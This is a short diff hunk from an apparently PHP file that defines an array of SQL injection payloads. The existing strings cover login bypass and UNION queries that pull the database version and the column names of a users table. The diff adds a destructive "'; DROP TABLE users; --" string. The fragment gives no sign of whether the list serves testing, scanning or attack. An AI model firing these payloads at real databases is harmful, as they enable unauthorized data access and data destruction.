@@ -16,6 +16,7 @@ $payloads = [
     "' OR 'a'='a' UNION SELECT 1,'admin','password'-- -",
     "' UNION SELECT 1,version(),3-- -",
     "' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -",
+    "'; DROP TABLE users; --",
 
 
 ];
